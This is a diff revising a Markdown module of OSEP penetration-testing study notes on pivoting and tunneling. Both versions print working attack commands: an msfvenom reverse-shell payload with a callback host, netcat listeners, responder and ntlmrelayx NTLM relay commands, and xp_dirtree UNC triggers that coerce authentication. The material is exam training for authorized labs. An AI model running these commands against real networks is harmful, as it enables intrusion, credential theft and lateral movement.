@@ -2,57 +2,33 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 08 · Pivoting & tunneling (port forwarding)
+# Pivoting and tunneling
 
-> **Covers scenarios:** 34, 35
->
-> **Course mapping:** Chapter 18 (§18.1.2–18.1.3 Reverse RDP proxying with Metasploit / Chisel), Chapter 19 (§19.1.3–19.1.4 SSH ControlMaster and agent-forwarding reuse), Chapter 20 (§20.1.3–20.1.4 UNC path injection and relay callback paths). The module's SOCKS/ligolo/ssh `-L/-D/-R` set is standard lab tooling, not a named book section.
->
-> **Core rule:** **Forward internal reachability ≠ target-initiated callback reachability** — design the two directions separately.
->
-> Lab files: `m08-ligolo-ng-setup.sh`, `m08-chisel-socks.sh`, `m08-port-forward.ps1`.
->
-> Keywords: `Ligolo-ng` `SSHUTTLE` `Autoroute` `Socks`.
+Forward reachability and target-initiated callbacks are two different paths — design them separately. Do not put Kali's `LHOST` into a payload, UNC path, or auth-callback address just because SOCKS already works. The target → Kali path may not exist; that mistake burns the most time.
 
----
+Reserve ports up front (see [00-environment-and-infra](/modules/00-environment-and-infra): 11601 = Ligolo proxy, 1080 = SOCKS, 8081 = example internal web). After any parameter change, verify with a harmless connect — never assume.
 
-## 1. One-line conclusions for both scenarios
-
-| Scenario | Problem | Conclusion |
-|---|---|---|
-| 34 | Internal site only accepts a specific subnet (Kali direct connect refused; controlled DEV host can reach it) | Use **local/dynamic forwarding** to bring the pivot’s reachability back to Kali; afterward every payload address must match the **same callback path as the pivot** |
-| 35 | SOCKS forward access to internal SQL/domain services is OK, but target **active auth** (callback) never reaches your listener | Forward (you initiate) and target-initiated callback are **two different paths**; put the receive point where the **target can reach** (pivot/agent host), then forward back to the Kali listener |
-
-**Do not**: because forward works, put Kali’s `LHOST` into parameters for target-initiated connects (UNC paths, payload LHOST, auth callback addresses). The target→Kali path may not exist — this mistake burns the most time.
-
----
-
-## 2. Three forwarding directions (decide before you act)
+## Decide the direction first
 
 | Type | Who listens | Who initiates | Typical command | Solves |
 |---|---|---|---|---|
-| Local forward `-L` | Local (Kali) | Kali | `ssh -L 127.0.0.1:8081:TARGET:8081 USER@PIVOT` | Kali needs an internal service (scenario 34 main path) |
-| Dynamic/SOCKS `-D` | Local (Kali) | Kali | `ssh -D 1080 USER@PIVOT` / chisel / msf socks_proxy | Arbitrary tools via proxy into the internal net (probe/enum/forward connect) |
-| Remote/reverse forward `-R` / listener | Host reachable from the target (pivot/agent) | Target initiates | ligolo `listener_add`, netsh portproxy, `ssh -R` | Target-initiated callbacks (reverse shell, NTLM auth callback — scenario 35) |
+| Local forward `-L` | Local (Kali) | Kali | `ssh -L 127.0.0.1:8081:TARGET:8081 USER@PIVOT` | Kali needs an internal service |
+| Dynamic / SOCKS `-D` | Local (Kali) | Kali | `ssh -D 1080 USER@PIVOT` / chisel / msf `socks_proxy` | Arbitrary tools via proxy into the internal net |
+| Remote / reverse forward `-R` / listener | Host reachable from the target (pivot / agent) | Target initiates | ligolo `listener_add`, netsh portproxy, `ssh -R` | Target-initiated callbacks (reverse shell, NTLM auth) |
 | Ligolo full subnet | Your Kali (tun iface) | Kali | `ip route add 172.16.X.0/24 dev ligolo` | Whole internal range as if local |
 
-**Essence of scenario 35**: a SOCKS proxy only carries connections **initiated by Kali**. When a target process (SQL `xp_dirtree`, reverse shell, auth callback) connects, it uses the **target’s own routing** — SOCKS cannot help. You must open a receive port on a host the target can reach, then tunnel that connection back to the Kali listener.
+A SOCKS proxy only carries connections **initiated by Kali**. When a target process (SQL `xp_dirtree`, reverse shell, auth callback) connects, it uses the **target's own routing** — SOCKS cannot help. Open a receive port on a host the target can reach, then tunnel that connection back to the Kali listener.
 
-**Port/address discipline**: use one shared address/port plan across stages (see `docs/00` port table: 11601=Ligolo proxy, 1080=SOCKS, 8081=example internal web); after changing any parameter, verify with a harmless connect — never assume.
+## Internal site only accepts a specified subnet
 
----
+If Kali's direct connect is refused (ACL only allows a given subnet) but a controlled DEV host can reach the site, bring the pivot's reachability back to Kali with local or dynamic forwarding. Afterward every payload address must follow the **same callback path as the pivot**. The web host behind upload or RCE may not be able to call Kali — put the receive port where that host can reach (usually the DEV host).
 
-## 3. Scenario 34: Internal site only accepts a specified subnet
+- [ ] Confirm DEV actually reaches the internal site, and whether DEV can egress to Kali
+- [ ] Build Kali → DEV forwarding (SSH `-L`/`-D`, Ligolo, or chisel — pick by what you have)
+- [ ] Hit the site over the working path and keep all later upload / RCE on that path
+- [ ] Open a receive port on DEV and set payload `LHOST` to the DEV internal IP, never Kali
+- [ ] Harmless-callback test before the real payload
 
-### Situation
-Kali’s direct connect to an internal site is refused (ACL only allows a given subnet), but a controlled DEV-net host can reach it; behind the site (example web06:8081) there is upload or command execution; the end goal is entry plus callback.
-
-### Assumptions
-- You control the DEV host, and Kali → DEV has a usable path (SSH creds / executable payload / Ligolo agent / chisel client).
-- Internal site IP is known (e.g. `172.16.X.50:8081`) and only the DEV subnet is allowed.
-- The web host behind upload/RCE **may not be able to callback to Kali**; design the callback for a path it can reach (usually = DEV host or a receive port you open in the DEV subnet).
-
-### Prepare (attacker)
 ```bash
 # Pre-reserve: local 8081 (forward port), 1080 (SOCKS), 11601 (ligolo)
 mkdir -p ~/osep/tools ~/osep/logs
@@ -60,43 +36,47 @@ mkdir -p ~/osep/tools ~/osep/logs
 # (see m08-*-setup.sh dependency notes)
 ```
 
-### Procedure
-**Step 0 · Confirm the pivot egress** (decides which tunnel):
+Confirm the pivot egress (this decides how you build the callback direction):
+
 ```bash
 # On DEV, confirm it really reaches the internal site (in an existing shell / tunnel)
 curl -s -o /dev/null -w '%{http_code}\n' http://172.16.X.50:8081/
 # Confirm DEV → Kali egress (this decides how you build the callback direction)
 ```
 
-**Step 1 · Build Kali → DEV forwarding** (pick one by what you have):
+If DEV has SSH, local forward and a dynamic proxy together is the simplest path:
 
-Option A: DEV has SSH (simplest) — local forward + dynamic proxy together:
 ```bash
 ssh -N -L 127.0.0.1:8081:172.16.X.50:8081 -D 1080 USER@DEV_IP
 # Browser/tools: http://127.0.0.1:8081 (local forward); other internal probes via 127.0.0.1:1080 SOCKS
 ```
 
-Option B: Ligolo-ng (DEV can run the agent, Windows/Linux) — see `m08-ligolo-ng-setup.sh`:
+If DEV can run a Ligolo agent (Windows or Linux), use `m08-ligolo-ng-setup.sh`:
+
 ```bash
 # Kali: proxy + tun + route (script subcommands proxy / route)
 sudo ip route add 172.16.X.0/24 dev ligolo
 # proxy console: session → start; then Kali hits http://172.16.X.50:8081 directly
 ```
-If the internal site runs on DEV itself (another common shape), use Ligolo’s special local-forward IP — no full subnet route needed:
+
+If the internal site runs on DEV itself, use Ligolo's local-forward IP — no full subnet route needed:
+
 ```bash
 sudo ip route add 240.0.0.1/32 dev ligolo   # 240.0.0.1 → DEV loopback
 curl http://240.0.0.1:8081/
 ```
 
-Option C: chisel (DEV can run chisel client) — see `m08-chisel-socks.sh`.
+If DEV can run a chisel client, use `m08-chisel-socks.sh`.
 
-**Step 2 · Verify internal site reachability + find upload/RCE**:
+Verify the site over the path you just built, and stay on it:
+
 ```bash
 curl -s http://127.0.0.1:8081/ -o /dev/null -w '%{http_code}\n'   # expect 200/302
-# All later upload/RCE interaction stays on this working path — do not switch back to Kali’s direct address
+# All later upload/RCE interaction stays on this working path — do not switch back to Kali's direct address
 ```
 
-**Step 3 · After execution on the web side, design the callback address** (critical): web-host callback target = **a receive port you can open on DEV**, forwarded through the tunnel to the Kali listener. Ligolo reverse-listener template:
+After execution on the web side, the callback target is a **receive port you open on DEV**, forwarded through the tunnel to the Kali listener. Ligolo reverse-listener template:
+
 ```
 # Kali terminal 1: real shell listener
 rlwrap -cAr nc -lvnp 4444
@@ -107,32 +87,16 @@ listener_list
 #   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<DEV_IP> LPORT=4445 -f exe -o rev.exe
 # After web-side exec: web host → DEV:4445 → ligolo tunnel → Kali 127.0.0.1:4444
 ```
+
 A Windows DEV pivot can also use `m08-port-forward.ps1` portproxy for the equivalent forward.
 
-### Lab files
-- `m08-ligolo-ng-setup.sh` (proxy/agent/route/reverse subcommands)
-- `m08-chisel-socks.sh` (alternate forward + proxychains)
-- `m08-port-forward.ps1` (netsh portproxy when DEV is Windows)
+Verify: `curl` to `http://127.0.0.1:8081/` is not refused; a harmless callback from the web entry (`nc <DEV_IP> 4445` or one download) completes the chain; after the reverse shell, `whoami` and `ipconfig /all` show the **web host**, not the pivot.
 
-### Verify
-1. `curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/` returns a non-refuse status.
-2. From the web entry, fire a harmless callback (e.g. `nc <DEV_IP> 4445` / one download) to confirm the full chain before the real payload.
-3. After the reverse shell: immediately `whoami`, `ipconfig /all` — confirm you landed on the **web host**, not the pivot.
+If local 8081 is already in use, switch to `127.0.0.1:18081` and update the URL — do not steal 11601 or 1080. If SSH is unavailable, switch to Ligolo or chisel; as long as DEV can run an agent, you do not need an SSH service. If the site is still unreachable, `curl` from DEV first to prove the ACL; it may be port- or protocol-specific — try HTTP → HTTPS or another target port. If the callback never reaches DEV:4445, harmless TCP first (web-side `nc` or a `ping`) to confirm web → DEV; if that fails, place another agent or listener in the same DEV subnet as a relay.
 
-### If it fails
-1. **Local 8081 already in use** → switch to `127.0.0.1:18081`, update the URL; do not steal 11601/1080.
-2. **SSH option unavailable (no creds/firewall)** → switch to Ligolo or chisel; as long as DEV can run an agent, you do not need an SSH service.
-3. **Site still unreachable** → on DEV first `curl` to prove the site is reachable; ACL may be port/protocol-specific — try http→https or another target port.
-4. **Callback payload never reaches DEV:4445** → harmless TCP test first (web-side `nc` or command injection `ping`) to confirm web→DEV; if not, place another agent/listener in the same DEV subnet as a relay.
+Ligolo `-selfcert` (cleartext channel) is fine for the exam; do not burn time on certs, and do not claim encryption in a report. One listener per forward port; confirm with `listener_list` / `ss -tlnp` that nothing is double-bound. Harmless verify before the real payload — a missed check in a forward chain stacks errors.
 
-### Exam / OPSEC notes
-- Ligolo with `-selfcert` (cleartext channel): fine for the exam; do not burn time on certs; **do not claim encryption in production/report writeups**.
-- One listener per forward port; confirm with `listener_list` / `ss -tlnp` that nothing is double-bound.
-- Harmless verify before real payload — missing one check in a forward chain stacks errors (wrong address + wrong port + wrong protocol is the slowest triage).
-
----
-
-#### `m08-ligolo-ng-setup.sh`
+::: details `m08-ligolo-ng-setup.sh` · click to expand
 
 ````bash
 #!/usr/bin/env bash
@@ -262,7 +226,8 @@ case "$1" in
 esac
 ````
 
-#### `m08-chisel-socks.sh`
+:::
+::: details `m08-chisel-socks.sh` · click to expand
 
 ````bash
 #!/usr/bin/env bash
@@ -362,7 +327,8 @@ case "$1" in
 esac
 ````
 
-#### `m08-port-forward.ps1`
+:::
+::: details `m08-port-forward.ps1` · click to expand
 
 ````powershell
 <#
@@ -453,29 +419,31 @@ switch ($Mode) {
 }
 ````
 
-## 4. Scenario 35: Proxy can reach the internal target, but target-initiated auth never hits your listener
+:::
+## Target-initiated callback never hits the listener
 
-### Situation
-You can reach internal SQL or domain services via SOCKS (forward OK), but when you trigger the target to **connect outbound** (SQL auth/relay, NTLM callback) nothing arrives at the listener. Forward access and target callback are different paths (basis: C4 SQL auth and relay situations).
+If SOCKS already reaches internal SQL or domain services but a target-initiated connect (SQL auth / relay, NTLM callback) never arrives, the two paths are different. Put the receive point where the **target can reach** (pivot / agent host), then forward back to the Kali listener.
 
-### Assumptions
-- You already have SOCKS/tunnel forward access to the internal target (`proxychains ... mssql` / domain queries work).
-- The target process (SQL Server, domain host) can initiate outbound connects to **some host in the same subnet**, but **not to Kali** (firewall/ACL/segmentation).
-- You control a host in the target subnet (Ligolo agent / Windows pivot), or have a place there where you can run a binary.
+- [ ] Confirm forward access already works (`proxychains` to SQL / domain queries)
+- [ ] Confirm the target can reach some same-subnet host, but not Kali
+- [ ] Free the Kali listen port and start the auth sink (stop `smbd` before binding 445)
+- [ ] Open a reverse forward on the agent / pivot (`listener_add`, portproxy, or `ssh -R`)
+- [ ] Put the **agent / pivot internal IP** in the trigger, never Kali
+- [ ] Trigger once and confirm the sink sees the target's source IP
 
-### Prepare (attacker)
 ```bash
 # Kali: auth sink + relay tools ready (run as root; SMB 445 needs privilege)
 sudo systemctl stop smbd   # free 445 or responder/ntlmrelayx will not bind
 sudo rlwrap responder -I eth0 -A    # or
 sudo ntlmrelayx.py -t smb://TARGET_IP -smb2support -c 'whoami'   # relay variant
 ```
-Confirm Kali’s local listen port (445/HTTP) matches the tunnel’s **`--to` 127.0.0.1 port**.
 
-### Procedure
-**Step 0 · Confirm “two paths”**: forward OK via proxychains does **not** mean the target can reach Kali. On a target-reachable host (agent/pivot), open a temporary listener and trigger one connect from the target side — see whether it arrives.
+Confirm Kali's local listen port (445 / HTTP) matches the tunnel's `--to 127.0.0.1` port.
 
-**Step 1 · Open a receive port where the target can reach (prefer Ligolo-ng listener; direction = reverse forward)**:
+A working proxychains forward does **not** mean the target can reach Kali. On a target-reachable host, open a temporary listener and trigger one connect from the target side — see whether it arrives.
+
+Prefer Ligolo-ng `listener_add` (direction = reverse forward):
+
 ```
 # Kali terminal 1: auth sink (real listen on Kali)
 sudo ntlmrelayx.py -t smb://<internal-target> -smb2support ...    # listen 0.0.0.0:445
@@ -483,82 +451,66 @@ sudo ntlmrelayx.py -t smb://<internal-target> -smb2support ...    # listen 0.0.0
 listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
 listener_list
 ```
-**Step 2 · Address in trigger params = agent host (the IP the target can reach), not Kali**:
+
+Address in trigger params = agent host (the IP the target can reach), not Kali:
+
 ```sql
 -- On target SQL, trigger outbound SMB auth (example: UNC directory listing)
 EXEC master..xp_dirtree '\\<AGENT_INTERNAL_IP>\share';
 -- or xp_subdirs / xp_fileexist; low-priv SQL can often still trigger (see [11-mssql](/modules/11-mssql))
 ```
-Auth packet path: target → `<AGENT_INTERNAL_IP>:445` → Ligolo tunnel → Kali 127.0.0.1:445 (ntlmrelayx/responder). Arrival means relay or capture the hash.
 
-**Step 3 · Windows pivot alternative (netsh portproxy, when the pivot can egress to Kali)**:
+Auth packet path: target → `<AGENT_INTERNAL_IP>:445` → Ligolo tunnel → Kali `127.0.0.1:445` (ntlmrelayx / responder). Arrival means relay or capture the hash.
+
+Windows pivot alternative (netsh portproxy, when the pivot can egress to Kali):
+
 ```powershell
 # On Windows pivot (admin): listen pivot 445 → forward to Kali ntlmrelayx
 netsh interface portproxy add v4tov4 listenport=445 listenaddress=<PIVOT_IP> connectport=445 connectaddress=<KALI_IP>
 # Trigger params become \\<PIVOT_IP>\share; verify: netsh interface portproxy show all
 ```
-Requires: pivot→Kali:445 egress allowed (agent/beacon egress usually implies this); target→pivot:445 allowed.
 
-**Step 4 · Linux pivot fallback (ssh -R; sshd must allow external bind)**:
+Requires: pivot → Kali:445 egress allowed (agent / beacon egress usually implies this); target → pivot:445 allowed. Use `m08-port-forward.ps1` for add / show / rollback.
+
+Linux pivot fallback (`ssh -R`; sshd must allow an external bind):
+
 ```bash
 # Run from Kali; bind pivot 0.0.0.0:445, forward to Kali 127.0.0.1:445
 ssh -N -R 0.0.0.0:445:127.0.0.1:445 USER@PIVOT_IP
 # sshd needs GatewayPorts clientspecified/yes; otherwise -R binds loopback only and the target cannot connect — confirm before relying on it
 ```
 
-### Lab files
-- `m08-ligolo-ng-setup.sh` (`reverse` subcommand — standard reverse-forward template)
-- `m08-port-forward.ps1` (Windows pivot portproxy, with rollback/cleanup)
-- Trigger-side templates: [11-mssql](/modules/11-mssql) and [16-ics-calendar](/modules/16-ics-calendar) (auth-trigger techniques)
+Trigger-side templates: [11-mssql](/modules/11-mssql) and [16-ics-calendar](/modules/16-ics-calendar). The Ligolo `reverse` subcommand prints the standard reverse-forward template.
 
-### Verify
-1. `listener_list` shows the listener; `ss -tlnp` shows 445 / the target port really listening on Kali.
-2. After trigger, ntlmrelayx/responder prints the auth source IP — should be the **target/relay party**, not Kali itself.
-3. Relay success: command/session on the target host; if only capturing hashes, confirm hash format matches your cracker.
+Verify: `listener_list` shows the listener; `ss -tlnp` shows 445 / the target port really listening on Kali. After the trigger, ntlmrelayx / responder prints the auth source IP — should be the **target / relay party**, not Kali itself. Relay success is a command or session on the target host; if you are only capturing hashes, confirm the format matches your cracker.
 
-### If it fails
-1. **Still no auth arrives** → back to Step 0: temporary `nc -lvnp` on a target-reachable host, manually trigger one TCP connect from the target side, decide “path broken” vs “trigger params ineffective” — change one variable at a time.
-2. **445 occupied / bind fails** → on Kali first `sudo systemctl stop smbd`; use a non-privileged port (e.g. 4455) as the `--to` target and sync the trigger side… (SMB auth must be 445; if relaying to 445 is constrained, switch to ntlmrelayx HTTP relay or responder capture then crack/replay the hash).
-3. **Target can only reach local loopback** (SQL and pivot are the same host / pivot is on the target) → place the agent/forwarder **on the target itself**; trigger address `127.0.0.1` (when ligolo agent runs on the target, `--addr 0.0.0.0:445` is local).
-4. **Ligolo unavailable** → pick among chisel / netsh portproxy / ssh -R whichever matches “target can reach” (pivot shape decides).
+If still no auth arrives, go back to a temporary `nc -lvnp` on a target-reachable host, trigger one TCP connect, and decide "path broken" vs "trigger params ineffective" — change one variable at a time. If 445 is occupied or the bind fails, `sudo systemctl stop smbd` on Kali first; a non-privileged `--to` port (e.g. 4455) can sink a test connect, but SMB auth itself must be 445 — if relaying to 445 is constrained, switch to ntlmrelayx HTTP relay or responder capture, then crack or replay the hash. If the target can only reach local loopback (SQL and the pivot are the same host), place the agent on the target itself and trigger `127.0.0.1` (`--addr 0.0.0.0:445` is local). If Ligolo is unavailable, pick among chisel / netsh portproxy / `ssh -R` whichever matches "target can reach".
 
-### Exam / OPSEC notes
-- Trigger auth **once** — do not spam; confirm the listener is up before each trigger.
-- SMB/HTTP relay needs target and relay **same subnet and SMB signing off** (probe first); EPA/signing conditions: [12-ad-attacks](/modules/12-ad-attacks) ESC8 and [16-ics-calendar](/modules/16-ics-calendar).
-- Address consistency rule: IP in trigger params is always “the host the target can reach”; port is always “the tunnel port opened on that target-side host” — write both down and reproduce them.
+Trigger auth **once** — confirm the listener is up before each attempt. SMB / HTTP relay needs the target and relay on the same subnet with SMB signing off (probe first); EPA / signing conditions: [12-ad-attacks](/modules/12-ad-attacks) ESC8 and [16-ics-calendar](/modules/16-ics-calendar). Write down both values and reuse them: the IP in trigger params is always "the host the target can reach"; the port is always "the tunnel port opened on that target-side host".
 
----
-
-## 5. Tool choice quick map (outside this module’s scope: not expanded)
+## Cheat sheet
 
 | Need | First choice | Fallback | Notes |
 |---|---|---|---|
-| Hit one internal web (scenario 34) | ssh `-L` (pivot has SSH) | ligolo 240.0.0.1 / chisel `R:` | avoid port clashes with 11601/1080 |
-| Whole internal range like local | Ligolo-ng full subnet route | sshuttle (pivot has SSH, needs root) | sshuttle weak on ICMP/UDP |
-| Arbitrary tools via proxy | proxychains + SOCKS (msf socks_proxy / chisel `R:socks` / ssh `-D`) | add `socks5 127.0.0.1 1080` to `proxychains4` | confirm trailing proxy line in `/etc/proxychains4.conf` |
-| Target-initiated callback sink (scenario 35) | Ligolo `listener_add --to 127.0.0.1:LPORT` | netsh portproxy / ssh `-R` | receive side always where the target can reach |
+| Hit one internal web | ssh `-L` (pivot has SSH) | ligolo `240.0.0.1` / chisel `R:` | avoid port clashes with 11601 / 1080 |
+| Whole internal range like local | Ligolo-ng full subnet route | sshuttle (pivot has SSH, needs root) | sshuttle weak on ICMP / UDP |
+| Arbitrary tools via proxy | proxychains + SOCKS (msf `socks_proxy` / chisel `R:socks` / ssh `-D`) | add `socks5 127.0.0.1 1080` to `proxychains4` | confirm the trailing proxy line in `/etc/proxychains4.conf` |
+| Target-initiated callback sink | Ligolo `listener_add --to 127.0.0.1:LPORT` | netsh portproxy / ssh `-R` | receive side always where the target can reach |
 | Metasploit in-session routing | `post/multi/manage/autoroute` + `auxiliary/server/socks_proxy` | `route` / `route flush` | SESSION platform mismatch warnings are usually harmless |
 | Double pivot (third layer) | Ligolo second tun + `listener_add 0.0.0.0:11601 --to 127.0.0.1:11601` | recurse the same pattern | one tun iface per layer — do not reuse |
 
-Metasploit quick notes:
+Metasploit:
+
 ```
 msf6 > use post/multi/manage/autoroute      # set SESSION / SUBNET / NETMASK
 msf6 > use auxiliary/server/socks_proxy     # set SRVHOST 127.0.0.1 / SRVPORT 1080 / VERSION 4a
 ```
-sshuttle quick notes (when pivot has SSH — more stable than proxychains for transparent internal web):
+
+sshuttle (when the pivot has SSH — more stable than proxychains for transparent internal web):
+
 ```bash
 sudo sshuttle -v -e "ssh -i id_rsa" -r USER@PIVOT_IP 172.16.X.0/24
 # then curl http://172.16.X.50:8081/ directly — no proxy prefix
 ```
 
----
-
-## 6. Related docs
-
-| Doc | Contents |
-|---|---|
-| [00-environment-and-infra](/modules/00-environment-and-infra) | Port plan (11601/1080/8081…), logging discipline |
-| [11-mssql](/modules/11-mssql) | Scenario 35 auth-trigger techniques (`xp_dirtree`, etc.) |
-| [16-ics-calendar](/modules/16-ics-calendar) | Another shape of externally triggered auth |
-| [09-c2-egress-channels](/modules/09-c2-egress-channels) | Egress channels and “same path for every stage” |
-| `m08-ligolo-ng-setup.sh` etc. | Lab-file usage for this module |
+Related: [00-environment-and-infra](/modules/00-environment-and-infra) (port plan), [11-mssql](/modules/11-mssql) (`xp_dirtree` triggers), [16-ics-calendar](/modules/16-ics-calendar), [09-c2-egress-channels](/modules/09-c2-egress-channels) (same path for every stage).
